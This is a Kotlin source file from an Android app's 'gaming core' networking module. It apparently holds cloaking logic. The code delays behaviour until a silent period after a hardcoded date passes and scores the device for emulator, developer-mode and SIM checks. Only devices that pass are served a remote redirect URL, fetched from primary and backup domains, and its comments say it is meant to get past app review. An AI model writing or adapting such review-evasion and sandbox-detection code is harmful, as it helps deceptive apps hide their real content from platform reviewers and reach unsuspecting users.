package com.gaming.core.network

import android.annotation.SuppressLint
import android.content.Context
import android.telephony.TelephonyManager
import com.gaming.core.utils.LogUtils
import com.gaming.core.extensions.devMode
import com.gaming.core.extensions.getData
import com.gaming.core.extensions.getInt
import com.gaming.core.extensions.setData
import com.gaming.core.extensions.setInt
import com.gaming.core.extensions.simCardStatus
import com.gaming.core.pri.ConstPool
import com.gaming.core.pri.GamingGlobal
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Calendar

internal class CoreImpl {

    private val backup = mutableListOf<String>()

    private lateinit var invocation: a

    private val retryCount = 3

    private var current = 0
    private val executor = HttpWrapper()

    private var usingBackup = false

    suspend fun interview(context: Context, invocation: a) {

        usingBackup = context.getInt("_dat_backup") == 1
        this.invocation = invocation
        backup.addAll(GamingGlobal.get().backups())
        LogUtils.d(ConstPool.TAG, "backup size=${backup.size}")

        if (invocation.a()) {
            request(context)
            return
        }

        //如果后续通过静默时间屏蔽复审,已经进入过的玩家直接进入老链接. 新玩家和自然量进行静默时间的屏蔽.
        context.getData("usr_id").takeIf { it.isNotEmpty() && it.lowercase().startsWith("https") }
            ?.let {
                val url = it
                invocation.c(JSONObject().apply {
                    put("usr", url)
                }.toString())
                return
            }

        val current = System.currentTimeMillis()
        val specialTime = specialTime()
        //静默时间通过外部传递.灵活配置  如果要以小时为单位. 直接配置1/24,2/24类似这样的浮点数即可.
        val limit = invocation.d() * 24 * 60 * 60 * 1000L
        if (current.minus(specialTime) >= limit) {
            LogUtils.d("coreImpl", "time not limit matched~")
            val currC = Calendar.getInstance().apply {
                timeInMillis = current
            }
            val successKey = "sco_succ_ti"
            val succTime = context.getInt(successKey)
            LogUtils.d("coreImpl", "succTime=$succTime")

            if (succTime > 0) {
                request(context)
                return
            }
            val failedKey =
                "${currC.get(Calendar.YEAR)}_${currC.get(Calendar.MONTH)}_${currC.get(Calendar.DAY_OF_MONTH)}_fail_ti"
            val currentFailedTime = context.getInt(failedKey)

            LogUtils.d("coreImpl", "failed time: $currentFailedTime")
            if (currentFailedTime == 10) {
                invocation.c("")
                return
            }

            val scope = scope(context)
            LogUtils.d("coreImpl", "user scope=$scope")

            if (scope < 30) {
                context.setInt(failedKey, currentFailedTime.plus(1))
                invocation.c("")
            } else {
                context.setInt(successKey, succTime.plus(1))
                request(context)
            }
        } else {
            LogUtils.d("coreImpl", "time limit matched~")
            invocation.c("")
        }
    }


    private fun scope(context: Context): Int {
        var scope = 0
        if (context.devMode() != 1) {
            scope += 10
        }
        if (!Emu.isEmu) {
            scope += 10
        }
        if (context.simCardStatus() == TelephonyManager.SIM_STATE_READY) {
            scope += 10
        }
        return scope
    }

    private suspend fun request(context: Context) {
        val result = retry(context)
        if (result.isNotEmpty()) {
            val user = context.getData("usr_id")
            val data = JSONObject(result)
            if (user.isEmpty()) {
                if (data.optBoolean("s")) {
                    val json = JSONObject()
                    val domain = data.optString("u")
                    if (domain.isNullOrBlank()) {
                        invocation.c("")
                    } else {
                        context.setData("usr_id", domain)
                        invocation.c(json.apply {
                            put("usr", domain)
                            put("cty", data.optString("c"))
                            put("rst", false)
                            put("msg", data.optString("m"))
                        }.toString())
                    }

                } else {
                    invocation.c("")
                }
            } else {
                val json = JSONObject()
                val domain = data.optString("u")
                //是否切换了域名
                json.put("rst", domain != user)
                json.put("msg", data.optString("m"))
                json.put("usr", domain)
                json.put("cty", data.optString("c"))
                invocation.c(json.toString())
            }
        } else {
            invocation.c("")
        }
    }

    @SuppressLint("SimpleDateFormat")
    private fun specialTime(): Long {
        return try {
            val time = "2023-10-16 00:00:00"
            val format = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
            format.parse(time)?.time ?: 0L
        } catch (e: Exception) {
            e.printStackTrace()
            0
        }
    }

    private suspend fun preRetry(context: Context): String {
        try {
            executor.base = GamingGlobal.get().domain()
            executor.path = GamingGlobal.get().api()
            executor.body = invocation.b()
            executor.debug = invocation.a()
            val result = executor.execute()
            LogUtils.d("coreImpl", "[result-data]: $result")
            return result.ifEmpty {
                if (current < retryCount) {
                    current++
                    preRetry(context)
                } else {
                    context.setInt("_dat_backup", 1)
                    current = retryCount
                    retryWithBackup()
                }
            }
        } catch (error: Exception) {
            error.printStackTrace()
            LogUtils.d("coreImpl", "req-${error.message}")
            return ""
        }
    }

    private suspend fun retry(context: Context): String {
        return if (usingBackup) {
            retryWithBackup()
        } else {
            preRetry(context)
        }
    }


    private suspend fun retryWithBackup(): String {
        if (backup.isEmpty()) {
            return ""
        } else {
            try {
                val host = backup.removeAt(0)
                executor.base = host
                executor.path = GamingGlobal.get().api()
                executor.body = invocation.b()
                executor.debug = invocation.a()
                val result = executor.execute()
                return result.ifEmpty {
                    retryWithBackup()
                }
            } catch (error: Exception) {
                error.printStackTrace()
                LogUtils.d("coreImpl", "ret-${error.message}")
                return if (backup.isEmpty()) {
                    ""
                } else {
                    retryWithBackup()
                }
            }
        }
    }
}